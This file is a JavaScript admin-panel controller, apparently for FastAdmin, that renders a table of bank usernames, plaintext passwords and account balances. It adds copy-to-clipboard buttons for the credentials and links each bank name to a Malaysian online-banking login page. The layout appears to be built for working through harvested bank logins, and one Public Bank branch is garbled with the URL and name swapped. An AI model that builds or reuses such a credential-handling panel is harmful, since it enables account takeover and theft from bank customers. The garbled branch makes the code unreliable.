define(['jquery', 'bootstrap', 'backend', 'table', 'form','clipboard.min'], function ($, undefined, Backend, Table, Form, ClipboardJS) {

    var Controller = {
        index: function () {
            // 初始化表格参数配置
            Table.api.init({
                extend: {
                    index_url: 'fry/index' + location.search,
                    add_url: 'fry/add',
                    edit_url: 'fry/edit',
                    // del_url: 'fry/del',
                    multi_url: 'fry/multi',
                    import_url: 'fry/import',
                    table: 'fry',
                }
            });

            var table = $("#table");

            // 初始化表格
            table.bootstrapTable({
                url: $.fn.bootstrapTable.defaults.extend.index_url,
                pk: 'id',
                sortName: 'id',
                columns: [
                    [
                        {checkbox: true},
                        {field: 'id', title: __('Id')},
                        {field: 'user_id', title: __('User_id')},
                        {field: 'bank_name', title: __('Bank_name'), operate: 'LIKE', formatter(value, row, index) {
                                if(value == 'Maybank'){
                                    return "<a href='https://www.maybank2u.com.my/home/m2u/common/login.do' target='_blank'>"+value+"</a>";
                                }else if(value == 'Affinbank'){
                                    return "<a href='https://rib.affinalways.com/retail/#!/login' target='_blank'>"+value+"</a>";
                                }else if(value == 'Alliancebank'){
                                    return "<a href='https://www.allianceonline.com.my/personal/login/login.do' target='_blank'>"+value+"</a>";
                                }else if(value == 'Ambank'){
                                    return "<a href='https://ambank.amonline.com.my/web/' target='_blank'>"+value+"</a>";
                                }else if(value == 'Bankislam'){
                                    return "<a href='https://www.bankislam.biz/' target='_blank'>"+value+"</a>";
                                }else if(value == 'Bankrakyat'){
                                    return "<a href='https://www2.irakyat.com.my/personal/login/login.do?step1=' target='_blank'>"+value+"</a>";
                                }else if(value == 'Bsn'){
                                    return "<a href='https://www.mybsn.com.my/mybsn/login/login.do' target='_blank'>"+value+"</a>";
                                }else if(value == 'Cimb'){
                                    return "<a href='https://www.cimbclicks.com.my/clicks/#/fpx' target='_blank'>"+value+"</a>";
                                }else if(value == 'Citibank'){
                                    return "<a href='https://www.citibank.com.my/MYGCB/JSO/username/signon/flow.action' target='_blank'>"+value+"</a>";
                                }else if(value == 'Hongleongbank'){
                                    return "<a href='https://s.hongleongconnect.my/rib/app/fo/login?web=1' target='_blank'>"+value+"</a>";
                                }else if(value == 'https://www2.pbebank.com/myIBK/apppbb/servlet/BxxxServlet?RDOName=BxxxAuth&MethodName=login'){
                                    return "<a href='Publicbank' target='_blank'>"+value+"</a>";
                                }else if(value == 'Rhbbank'){
                                    return "<a href='https://onlinebanking.rhbgroup.com/my/login' target='_blank'>"+value+"</a>";
                                }else if(value == 'Publicbank'){
                                    return "<a href='https://www2.pbebank.com/myIBK/apppbb/servlet/BxxxServlet?RDOName=BxxxAuth&MethodName=login' target='_blank'>"+value+"</a>";
                                }else{
                                    return value;
                                }
                            },
                        },
                        {field: 'username', title: __('Username'), operate: 'LIKE' , formatter:function (value,row,index){
                                return '<a href="javascript:;"  data-clipboard-text="'+value+'" class="btn-copy" data-toggle="tooltip" data-original-title="点击复制">'+value+'</a>';
                            }},
                        {field: 'password', title: __('Password'), operate: 'LIKE', formatter:function (value,row,index){
                                return '<a href="javascript:;"  data-clipboard-text="'+value+'" class="btn-copy" data-toggle="tooltip" data-original-title="点击复制">'+value+'</a>';
                            }},
                        {field: 'balance', title: __('Balance'), operate:'BETWEEN'},
                        {field: 'createtime', title: __('Createtime'), operate:'RANGE', addclass:'datetimerange', autocomplete:false, formatter: Table.api.formatter.datetime},
                        {field: 'status', title: __('Status'), searchList: {"1":__('Status 1'),"2":__('Status 2')}, formatter: Table.api.formatter.status},
                        {field: 'remarks', title: __('Remarks'), operate: 'LIKE'},
                        {field: 'operate', title: __('Operate'), table: table, events: Table.api.events.operate, formatter: Table.api.formatter.operate}
                    ]
                ]
            });

            // 为表格绑定事件
            Table.api.bindevent(table);
            //绑定复制事件
            var clipboard = new ClipboardJS('.btn-copy');
            clipboard.on('success', function(e) {
                Toastr.success('复制成功');
            });
            clipboard.on('error', function(e) {
                Toastr.error('复制失败，请刷新后重试');
            });
        },
        add: function () {
            Controller.api.bindevent();
        },
        edit: function () {
            Controller.api.bindevent();
        },
        api: {
            bindevent: function () {
                Form.api.bindevent($("form[role=form]"));
            }
        }
    };
    return Controller;
});
